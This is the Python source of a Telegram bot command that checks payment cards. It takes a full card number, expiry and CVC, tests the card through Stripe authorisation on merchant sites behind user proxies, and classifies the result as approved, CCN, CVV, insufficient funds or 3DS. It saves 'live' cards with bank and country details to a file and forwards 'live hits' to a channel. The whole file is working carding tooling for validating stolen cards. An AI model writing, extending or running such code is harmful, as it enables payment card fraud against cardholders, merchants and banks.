import re
import time
import threading
from html import escape
from config import CHANNEL_ID
from site_auth_manager import process_card_for_user_sites, _load_state
from bininfo import round_robin_bin_lookup
from proxy_manager import get_user_proxy
import pycountry
from runtime_config import get_default_site
from shared_state import user_busy, save_live_cc_to_json

# ============================================================
# ✅ Thread-safe global lock for user_busy dictionary
# ============================================================
user_busy_lock = threading.Lock()

# ✅ Per-user locks
user_locks = {}
user_locks_lock = threading.Lock()


def register_manual_check(bot, allowed_users):
    @bot.message_handler(func=lambda m: m.text and re.match(r'^(\.|/)?chk\b', m.text.strip(), re.IGNORECASE))
    def manual_check(message):
        threading.Thread(
            target=process_manual_check,
            args=(bot, message, allowed_users),
            daemon=True
        ).start()


def country_to_flag(country_name: str) -> str:
    """
    Convert a country name into a flag emoji.
    Works with exact matches, partial matches, and common variations.
    """
    try:
        if not country_name:
            return ""

        country_name = country_name.strip()
        country = pycountry.countries.get(name=country_name)

        if country:
            pass
        else:
            country = pycountry.countries.get(common_name=country_name)
            if country:
                pass

        if not country:
            try:
                country = next(
                    c for c in pycountry.countries
                    if hasattr(c, "official_name") and c.official_name.lower() == country_name.lower()
                )
            except StopIteration:
                pass

        if not country:
            matches = [c for c in pycountry.countries if country_name.lower() in c.name.lower()]
            if matches:
                country = matches[0]
                pass

        if not country:
            return ""

        code = country.alpha_2
        flag = "".join(chr(127397 + ord(c)) for c in code.upper())
        return flag

    except Exception:
        return ""


def process_manual_check(bot, message, allowed_users):
    start_time = time.perf_counter()
    chat_id = str(message.chat.id)

    # ============================================================
    # 🚦 Prevent running if already busy (thread-safe)
    # ============================================================
    with user_busy_lock:
        if user_busy.get(chat_id):
            bot.send_message(chat_id, "⚠ You already have an active check running.")
            return
        user_busy[chat_id] = True

    text = message.text.strip()

    # ============================================================
    # 🚫 Access control
    # ============================================================
    if chat_id not in allowed_users:
        try:
            bot.reply_to(message, "🚫 You don't have access to use /chk.\nUse /request to ask the admin.")
        except Exception:
            bot.send_message(chat_id, "🚫 You don't have access to use /chk.\nUse /request to ask the admin.")
        with user_busy_lock:
            user_busy.pop(chat_id, None)
        return

    # ============================================================
    # ✅ Per-user lock
    # ============================================================
    with user_locks_lock:
        if chat_id not in user_locks:
            user_locks[chat_id] = threading.Lock()
        lock = user_locks[chat_id]

    if not lock.acquire(blocking=False):
        try:
            msg = bot.reply_to(message, "⚠ Already running. Please wait and try again later.")
        except Exception:
            msg = bot.send_message(chat_id, "⚠ Already running. Please wait and try again later.")
        threading.Thread(
            target=lambda: (time.sleep(5), bot.delete_message(message.chat.id, msg.message_id)),
            daemon=True
        ).start()
        with user_busy_lock:
            user_busy.pop(chat_id, None)
        return

    try:
        # ============================================================
        # 🧩 MAIN CHECKING LOGIC (unchanged)
        # ============================================================
        match = re.match(r'^(\.|/)?chk\s+(.+)', text, re.IGNORECASE)
        if not match:
            bot.reply_to(
                message,
                "❌ Usage: /chk card|month|year|cvc (MM|YY or MM|YYYY)\n"
                "Example: /chk 4242424242424242|12|25|123"
            )
            return

        rest = match.group(2).strip()
        fields = re.split(r"\s*\|\s*", rest)
        if len(fields) != 4:
            bot.reply_to(
                message,
                "❌ Invalid format.\n"
                "Use: card|month|year|cvc (MM|YY or MM|YYYY)\n"
                "Example: /chk 4242424242424242|12|25|123"
            )
            return

        card_number, exp_month, exp_year, cvc = fields
        card_data = f"{card_number}|{exp_month}|{exp_year}|{cvc}"

        # 🟢 Start live status message
        try:
            status_msg = bot.reply_to(message, "⏳ <code>Please wait... [<b>Checking</b>]</code>", parse_mode="HTML")
        except Exception:
            status_msg = bot.send_message(chat_id, "<code>⏳ Please wait... [<b>Checking</b>]</code>", parse_mode="HTML")

        def update_phase(phase_text):
            """Edit the same Telegram message instantly — no delay, no resend."""
            text_show = f"⏳ <code>Please wait...<b>{phase_text}</b></code>"
            try:
                bot.edit_message_text(
                    text_show,
                    chat_id=status_msg.chat.id,
                    message_id=status_msg.message_id,
                    parse_mode="HTML"
                )
            except Exception as e:
                # Ignore harmless edit errors (like "message is not modified")
                if "message is not modified" not in str(e).lower():
                    pass

        # Phase 1️⃣ Checking

        # Phase 2️⃣ Proxy setup
        user_proxy = get_user_proxy(chat_id)
        proxy_for_card = True if user_proxy else False
        update_phase("Proxy ✅" if proxy_for_card else "Proxy❌")

        site_num = None
        final_status = "DECLINED"
        final_message_detail = ""
        raw_card_for_bin = card_data
        result = {}

        # ============================================================
        # 🔄 Actual card processing
        # ============================================================
        try:
            update_phase("")
            user_proxy = get_user_proxy(chat_id)
            # ============================================================
            # 🧩 PRE-VALIDATION: Card format check before process_card()
            # ============================================================
            parts = card_data.split("|")
            if len(parts) != 4:
                bot.send_message(chat_id, "❌ Invalid card format. Use card|month|year|cvc")
                return

            n, mm, yy, cvc = [p.strip() for p in parts]
            # Card number validation
            if not n.isdigit() or len(n) < 13 or len(n) > 19:
                bot.send_message(chat_id, "❌ Your card number is incorrect.")
                return

            # Expiry month validation
            if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
                bot.send_message(chat_id, "❌ Invalid expiry month.")
                return

            # Expiry year validation (supports YY or YYYY)
            if not yy.isdigit():
                bot.send_message(chat_id, "❌ Invalid expiry year.")
                return

            if len(yy) == 2:
                yy_int = int("20" + yy)
            else:
                yy_int = int(yy)

            from datetime import datetime
            current_year = datetime.now().year
            if yy_int < current_year or yy_int > current_year + 10:
                bot.send_message(chat_id, "❌ Invalid expiry year.")
                return

            # CVC validation
            if not cvc.isdigit() or len(cvc) not in (3, 4):
                bot.send_message(chat_id, "❌ Your card number is incorrect.")
                return

            site_url, result = process_card_for_user_sites(card_data, chat_id, proxy=user_proxy)

            # ✅ Ensure proxy flag is always present
            if isinstance(result, dict):
                if "_used_proxy" not in result:
                    result["_used_proxy"] = bool(user_proxy)

            if result:
                final_status = result.get("status", "DECLINED").upper()
                final_message_detail = result.get("reason", "Declined")
                raw_card_for_bin = card_data
            else:
                final_status = "DECLINED"
                final_message_detail = "Declined"

        except Exception as e:
            final_status = "DECLINED"
            if "Stripe" in str(e):
                final_message_detail = "Error: Failed during Stripe processing"
            elif "site" in str(e).lower():
                final_message_detail = "Error: Site response failed"
            else:
                final_message_detail = f"Error: {e}"

        # Determine site number
        try:
            state = _load_state(chat_id)
            user_sites = list(state.get(str(chat_id), {}).keys())
            if not user_sites:
                user_sites = [get_default_site()]
            if site_url in user_sites:
                site_num = user_sites.index(site_url) + 1
            if len(user_sites) <= 1:
                site_num = None
        except Exception:
            site_num = None

        # Phase 4️⃣ Final response
        top_status = result.get("top_status", "Declined ❌")
        final_status = result.get("status", "DECLINED")
        status_display = result.get("display_status", "DECLINED")
        emoji = result.get("emoji", "❌")

        # 🔎 Extract and normalize reason from result or Stripe/site data
        raw_reason = str(
            result.get("reason")
            or result.get("raw_reason")
            or result.get("message")
            or result.get("stripe", {}).get("error", {}).get("message")
            or ""
        ).lower()

        raw_reason = re.sub(r"(?i)^stripe:\s*", "", raw_reason).strip()

        if any(word in raw_reason for word in ["requires_action", "3d", "3ds", "authentication_required", "authentication"]):
            final_message_detail = "3D Secure authentication required."
            final_status = "3DS_REQUIRED"

        elif any(word in raw_reason for word in [
            "incorrect_number", "card number is incorrect", "your card number is incorrect",
            "your card is incorrect", "invalid number"
        ]):
            final_message_detail = "Your card number is incorrect."
            final_status = "DECLINED"

        elif any(word in raw_reason for word in [
            "security", "cvc", "cvv", "invalid cvc", "invalid cvv",
            "wrong cvc", "wrong cvv", "incorrect cvc", "incorrect cvv",
            "security code incorrect", "your card security", "card security incorrect",
            "invalid security", "check code", "cvc does not match", "cvv does not match"
        ]):
            final_message_detail = "Your card security is incorrect."
            final_status = "CCN"

        elif any(word in raw_reason for word in [
            "insufficient", "not enough funds", "low balance",
            "declined insufficient", "insufficient_funds"
        ]):
            final_message_detail = "Insufficient funds."
            final_status = "INSUFFICIENT_FUNDS"

        elif any(word in raw_reason for word in [
            "expired", "expiry", "expiration", "invalid expiry",
            "invalid exp date", "card expired", "expired_card"
        ]):
            final_message_detail = "Expired card."
            final_status = "DECLINED"

        elif "pickup" in raw_reason or "stolen" in raw_reason:
            final_message_detail = "Stolen or blocked card."
            final_status = "DECLINED"

        elif any(word in raw_reason for word in ["support", "does not support", "unsupported"]):
            final_message_detail = "Your card does not support this type of purchase."
            final_status = "CVV"

        elif "site" in raw_reason:
            final_message_detail = "Site response failed."
            final_status = "DECLINED"

        elif "stripe" in raw_reason and not "error" in raw_reason:
            final_message_detail = "Stripe error occurred."
            final_status = "DECLINED"

        else:
            final_message_detail = (
                result.get("reason")
                or result.get("raw_reason")
                or result.get("message")
                or "Your card was declined."
            )

        # 🧹 Clean duplicate decline phrases
        final_message_detail = re.sub(
            r"\bcard declined\s*\(.*your card was declined.*\)",
            "Your card was declined",
            final_message_detail,
            flags=re.I
        ).strip()

        if "your card was declined" in final_message_detail.lower() and "(" in final_message_detail:
            final_message_detail = "Your card was declined."

        if final_status == "CARD ADDED":
            final_status = "Card Added"

        elapsed = time.perf_counter() - start_time

        # ============================================================
        # 🔍 BIN lookup and live JSON save
        # ============================================================
        try:
            bin_lookup = round_robin_bin_lookup(raw_card_for_bin.split("|")[0])
            bin_number_only = bin_lookup.get("bin", raw_card_for_bin.split("|")[0][:6])
            scheme = bin_lookup.get("scheme", "Unknown")
            card_type = bin_lookup.get("type", "Unknown")
            brand = bin_lookup.get("brand", "Unknown")
            bank = bin_lookup.get("bank", "Unknown Bank")
            country = bin_lookup.get("country", "Unknown Country")

            if any(word in str(final_status).upper() for word in ["LIVE", "APPROVED", "CARD", "CCN", "CVV", "INSUFFICIENT", "3DS"]):
                live_entry_full = {
                    "cc": raw_card_for_bin,
                    "status": result.get("top_status", final_status),
                    "site": site_url,
                    "scheme": scheme,
                    "type": card_type,
                    "brand": brand,
                    "bank": bank,
                    "country": country,
                    "proxy": result.get("_used_proxy", False),
                    "message": result.get("reason", final_message_detail),
                }
                save_live_cc_to_json(chat_id, 1, live_entry_full)

        except Exception:
            bin_number_only = raw_card_for_bin.split("|")[0][:6]
            scheme = card_type = brand = bank = country = "Unknown"

        try:
            user = bot.get_chat(chat_id)
            if user.first_name:
                username_display = user.first_name
            elif user.last_name:
                username_display = user.last_name
            elif user.username:
                username_display = f"@{user.username}"
            else:
                username_display = f"User {chat_id}"
        except Exception:
            username_display = f"User {chat_id}"
        # ============================================================
        # 🧩 Update top_status and emoji based on final_status/message
        # ============================================================
        msg_lower = final_message_detail.lower()

        if any(x in msg_lower for x in ["auth success", "card added", "approved", "payment added"]):
            top_status = "Approved ✅"
            final_status = "APPROVED"
            emoji = "✅"
        elif final_status in ["CCN"]:
            top_status = "CCN 🔥"
            emoji = "🔥"
        elif final_status in ["CVV"]:
            top_status = "CVV ⚠️"
            emoji = "⚠️"
        elif final_status in ["INSUFFICIENT_FUNDS"]:
            top_status = "Insufficient Funds"
            emoji = ""
        elif final_status in ["3DS_REQUIRED"]:
            top_status = "3DS ⚠️"
            emoji = "⚠️"
        else:
            top_status = "Declined ❌"
            emoji = "❌"

        safe_raw_card = escape(raw_card_for_bin)
        final_msg = (
            f"<code><b>{top_status}</b></code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<code>✧ <b>Card:</b></code> <code>{safe_raw_card}</code>\n"
            f"<code>✧ <b>Gateway:</b> Stripe Auth</code>\n"
            f"<code>✧ <b>Status:</b> {final_status}{emoji}</code>\n"
            f"<code>✧ <b>Message:</b> {final_message_detail}</code>\n"
            f"<code>✧ <b>Type:</b> {scheme} | {card_type} | {brand}</code>\n"
            f"<code>✧ <b>Bank:</b> {escape(bank)}</code>\n"
            f"<code>✧ <b>Country:</b> {escape(country)} {country_to_flag(country)}</code>\n"
            f"<code>✧ <b>Proxy:</b> {'Live ✅' if result.get('_used_proxy', False) else 'None'}</code>{f'<code>[{site_num}]</code>' if site_num else ''}\n"
            f"<code>✧ <b>Checked by:</b> <b>{escape(username_display)}</b></code> <code>[</code><code>{chat_id}</code><code>]</code>\n"
            f"<code>✧ <b>Time:</b> {elapsed:.2f}s ⏳</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
        )

        try:
            bot.edit_message_text(
                final_msg,
                chat_id=chat_id,
                message_id=status_msg.message_id,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception:
            try:
                bot.send_message(chat_id, final_msg, parse_mode="HTML", disable_web_page_preview=True)
            except Exception:
                pass

        # ✅ Forward live hits to channel
        if final_status in ("PAYMENT_ADDED", "Card Added", "APPROVED", "CCN", "INSUFFICIENT_FUNDS", "CVV"):
            try:
                bot.send_message(
                    CHANNEL_ID,
                    final_msg,
                    parse_mode="HTML",
                    disable_web_page_preview=True
                )
            except Exception:
                pass

    # ============================================================
    # 🧹 Always release lock and mark user not busy — even if errors occur
    # ============================================================
    finally:
        try:
            if 'lock' in locals() and lock.locked():
                lock.release()
        except Exception as e:
            import logging
            logging.warning(f"[LOCK RELEASE WARNING] {e}")

        with user_busy_lock:
            user_busy.pop(chat_id, None)
